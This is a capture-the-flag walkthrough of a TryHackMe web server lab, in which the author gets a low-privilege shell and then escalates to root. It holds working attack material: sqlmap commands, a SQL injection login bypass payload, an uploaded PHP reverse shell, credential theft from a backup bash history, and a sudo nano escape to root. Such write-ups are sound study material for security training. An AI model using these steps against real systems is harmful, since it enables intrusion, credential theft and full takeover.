@@ -1,0 +1,297 @@
+		   _____       _ _                 
+		  / ____|     | | |                
+		 | |  __  __ _| | | ___ _ __ _   _ 
+		 | | |_ |/ _` | | |/ _ \ '__| | | |
+		 | |__| | (_| | | |  __/ |  | |_| |
+		  \_____|\__,_|_|_|\___|_|   \__, |
+				              __/ |
+				             |___/ 
+	       Try to exploit our image gallery system!
+
+https://tryhackme.com/room/gallery666
+
+-- [ 1 ] --
+
+To begin this CTF challenge we start by reading the intro:
+
+"Our gallery is not very well secured.".
+
+As this is CTF challenege is marked as "easy" and the title says "not very well secured" im going to start by 
+looking for low hanging fruits that may exist.
+
+--- [ Question 01: ] ---
+"How many ports are open?".
+
+-- [ Nmap ] --
+
+nmap: sudo nmap -sC -sV -A 10.10.93.129
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-open-proxy: Proxy might be redirecting requests
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Simple Image Gallery System
+
+We begin our enumeration with using nmap to answer the first question. As we can see only 2 ports are open here, 
+80 and 8080 with the http title being "Simple Image Gallery System" on port 8080 and on port 80 the title reads: 
+"Apache2 Ubuntu Default Page: It works". As we can see port 80 is a typical default "it works" page once you initially 
+set up a web server and on port 8080 a web application seems to be present so we start by visiting 10.10.93.129:8080.
+
+Port 8080 redirects us to '/gallery/login.php' (which gobuster also finds). A login page We dont hold any credentials for. 
+I normally test login pages for SQLi as one of the first things i try. To do this i use burpsuite to catch the request 
+using "test" as both the username and password, i then run 'sqlmap.py -r request.txt --dbs' and see if it comes back as 
+vulnerable, if it does i then move to using SQLi payloads from [1] to bypass the login page while downloading the database 
+with sqlmap.
+
+[1] https://github.com/payloadbox/sql-injection-payload-list
+
+To begin lets catch the login reuqest with burpsuite and run it through sqlmap to see if the login page is vulnerable to SQLi 
+if it is then we'll bypass login, download database and proceed, if not then we'll move onto trying other methods.
+
+-- [ Sqlmap ] --
+
+Request:
+-----------------------------------------------------------------------
+POST /gallery/classes/Login.php?f=login HTTP/1.1
+Host: 10.10.93.129
+Content-Length: 27
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://10.10.93.129
+Referer: http://10.10.93.129/gallery/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: PHPSESSID=q5q7bs12096k6ufons35i6dauc
+Connection: close
+
+username=test&password=test
+-----------------------------------------------------------------------
+
+We save this into request.txt and run sqlmap through it.
+
+-----------------------------------------------------------------------
+Sqlmap: sqlmap.py -r request.txt --dbs
+-----------------------------------------------------------------------
+
+-----------------------------------------------------------------------
+Sqlmap returns: "POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based 
+blind (query SLEEP)' injectable it looks like the back-end DBMS is 'MySQL'.".
+-----------------------------------------------------------------------
+
+This shows our POC that the login page is in fact vulnerable to SQLi and now we can try different
+SQLi payloads from [1] to see if we can bypass the login while using sqlmap to download the entire 
+database.
+
+I use: "' OR 1 -- -" as a payload and it works! We now have access to the admin panel of the website.
+From here we'll look for any upload forms so that we can upload our web shell and start our post 
+exploitation.
+
+POC:
+-----------------------------------------------------------------------
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=test' AND (SELECT 9880 FROM (SELECT(SLEEP(5)))snsm) AND 'MIWd'='MIWd&password=test
+-----------------------------------------------------------------------
+
+From sqlmap output we also know the backend database is MariaDB (MySQL) which is important to know for when we
+get a shell so we can log into the database and view the admin hash! You could use sqlmap by doing:
+
+-----------------------------------------------------------------------
+Sqlmap: sqlmap.py -r request.txt --dump -D gallery_db --tables -T users
+-----------------------------------------------------------------------
+
+--- [ Question 02 ] ---
+
+"What's the name of the CMS?".
+
+The http title of the site on port 8080 shows "Simple Image Gallery System" and so does
+the title on the admin panel so it's a fair assumption to think that the name of the CMS
+would be a variant of the http title.
+
+--- [ Question 03 ] ---
+
+"What's the hash password of the admin user?".
+
+To answer this question we need the admins password hash. We can either do two things, upload our webshell,
+look for a config file with the database username and password in it as is common with CMS such as wordpress 
+wp-config.php, log into the database and dump it to find the password hash or we can dump the database
+with sqlmap. Im going to go with option one, login and view the database locally however if you were to use
+sqlmap you would want to do:
+
+-----------------------------------------------------------------------
+Sqlmap: sqlmap.py -r request.txt --dump -D gallery_db --tables -T users
+-----------------------------------------------------------------------
+
+Now we are on the admin panel we go to '/gallery/?page=albums/images&id=4' and upload our webshell. Im going 
+to use the pentest monkey php reverse shell [2] to do this because i tried launching netcat with '-e /bin/bash'
+from a weeevly webshell and it didnt work.
+
+[2] https://github.com/pentestmonkey/php-reverse-shell
+
+After uploading the shell i copy the link location of the image and go to it after setting my netcat listener.
+We now have a reverse shell connection but the shell needs stabilizing so that we can use it as near native to
+a linux terminal as we can get with tab auto complete and such things.
+
+Stabilize shell:
+-----------------------------------------------------------------------
+1. python3 -c 'import pty;pty.spawn("/bin/bash");'
+2. stty -a (Too see row and col values to set)
+3. stty rows <NUMBER> cols <NUMBER> (We need this for terminal text editors like vim and nano to work correctly)
+4. echo $SHELL
+5. export SHELL=bash
+6. echo $TERM
+7. export TERM=xterm-256color
+8. press CTRL+Z
+9. stty raw -echo ; fg
+9. reset
+-----------------------------------------------------------------------
+
+Smash the enter key a few times and boom we have a stable shell which also allows us to use terminal text editors if
+required.
+
+-- [ Post exploitation ] --
+
+Time to look for database credentials and login to view the database and grab the admin hash to answer question 03.
+
+I do: 'cd /var/www/html' and locate the CMS. The CMS is located in "Gallery" directory.
+-----------------------------------------------------------------------
+www-data@gallery:/var/www/html/gallery$ ls -la
+total 96
+drwxr-xr-x 16 www-data www-data 4096 Aug 25  2021 .
+drwxr-xr-x  3 www-data www-data 4096 Aug 25  2021 ..
+-rwxr-xr-x  1 www-data www-data  225 Mar 19  2021 .htaccess
+-rwxr-xr-x  1 www-data www-data  198 Mar 19  2021 404.html
+drwxr-xr-x  2 www-data www-data 4096 Aug  9  2021 albums
+drwxr-xr-x  2 www-data www-data 4096 Aug  9  2021 archives
+drwxr-xr-x  4 www-data www-data 4096 Jun 28  2021 assets
+drwxr-xr-x  6 www-data www-data 4096 Jun 28  2021 build
+drwxr-xr-x  2 www-data www-data 4096 Aug 25  2021 classes
+-rwxr-xr-x  1 www-data www-data 1629 Aug  9  2021 config.php
+-rwxr-xr-x  1 www-data www-data   26 Aug 25  2021 create_account.php
+drwxr-xr-x  2 www-data www-data 4096 Aug 25  2021 database
+drwxr-xr-x  4 www-data www-data 4096 Jun 28  2021 dist
+-rwxr-xr-x  1 www-data www-data 1662 Aug  9  2021 home.php
+drwxr-xr-x  2 www-data www-data 4096 Jun 28  2021 inc
+-rwxr-xr-x  1 www-data www-data 3208 Aug  9  2021 index.php
+-rwxr-xr-x  1 www-data www-data  695 Aug 25  2021 initialize.php
+-rwxr-xr-x  1 www-data www-data 3942 Aug 25  2021 login.php
+drwxr-xr-x 61 www-data www-data 4096 Jul 16  2021 plugins
+drwxr-xr-x  2 www-data www-data 4096 Aug  6  2021 report
+drwxr-xr-x  2 www-data www-data 4096 Aug  6  2021 schedules
+drwxr-xr-x  2 www-data www-data 4096 Jun 28  2021 system_info
+drwxr-xr-x  3 www-data www-data 4096 Aug 25  2021 uploads
+drwxr-xr-x  2 www-data www-data 4096 Jun 28  2021 user
+-----------------------------------------------------------------------
+
+The only file which contains database credentials is initialize.php which has the database, user and password.
+After catting open initialize.php to find the database login credentials we now have an issue. Our current user
+which is www-data user doesnt have the correct permissions to log into the database. 'cd /home' we see two dirs,
+one called "ubuntu" and another called "mike". I take a guess and imagine that mike is the user we need to use
+to log into the database with. I need his credentials though. He has the user.txt file but of course without
+logging in as him we cant open the file.
+
+-- [ Compromizing mikes account ] --
+
+After running linpeas on the target we find '/var/backups/mike_home_backup' which contains mikes credentials in his
+bash history. This file isnt accessible for our user as we lack the correct perms in mikes home dir, however the 
+backups are insecure and can be accessed by anyone allowing us to view the file contents.
+
+Bash History: cat .bash_history
+-----------------------------------------------------------------------
+su mike: <PASSWORD>:
+mike@gallery:/home$ whoami;id
+mike
+uid=1001(mike) gid=1001(mike) groups=1001(mike)
+-----------------------------------------------------------------------
+
+Now that we have authenticated as the mike user we can now log into the database and dump the admin password hash.
+
+Logging in:
+-----------------------------------------------------------------------
+mike@gallery:/home$ mysql -u gallery_user -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 10608
+Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+
+-- [ Grabbing admin password hash ] --
+
+1. MariaDB [(none)]> connect gallery_db
+2. MariaDB [gallery_db]> show tables;
+3. MariaDB [gallery_db]> select * from users;
+-----------------------------------------------------------------------
+
+We now have the admin password hash and can answer question 03. We have now completed task 01 of this
+challenge. We now need to root this box, grab the root.txt flag and finish up!
+
+-- [ Rooting ] --
+
+Too start off rooting this box we are going to run 'sudo -l' to see if the current user can run any binaries with
+root permissions.
+
+sudo -l:
+-----------------------------------------------------------------------
+Matching Defaults entries for mike on gallery:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mike may run the following commands on gallery:
+    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
+-----------------------------------------------------------------------    
+
+We can only run a script as root so lets read the script to see what it does:
+-----------------------------------------------------------------------
+mike@gallery:/var/backups/mike_home_backup$ cat /opt/rootkit.sh
+#!/bin/bash
+
+read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;
+
+# Execute your choice
+case $ans in
+    versioncheck)
+        /usr/bin/rkhunter --versioncheck ;;
+    update)
+        /usr/bin/rkhunter --update;;
+    list)
+        /usr/bin/rkhunter --list;;
+    read)
+        /bin/nano /root/report.txt;;
+    *)
+        exit;;
+esac
+-----------------------------------------------------------------------
+
+The read function runs a nano binary rkhunter isnt much use for us here. Checking [3] we see how to root this box with nano.
+
+[3] https://gtfobins.github.io/gtfobins/nano/
+
+-----------------------------------------------------------------------
+Run: sudo /bin/bash /opt/rootkit.sh and use 'read'.
+
+Do:
+^R^X
+reset; sh 1>&0 2>&0
+-----------------------------------------------------------------------
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+We now have root. Nice and easy! (Remember to set your rows and columns when stablizing your shell otherwise this stage wont work!)
+
+Simply 'cd /root' and cat 'root.txt' to grab the final flag.
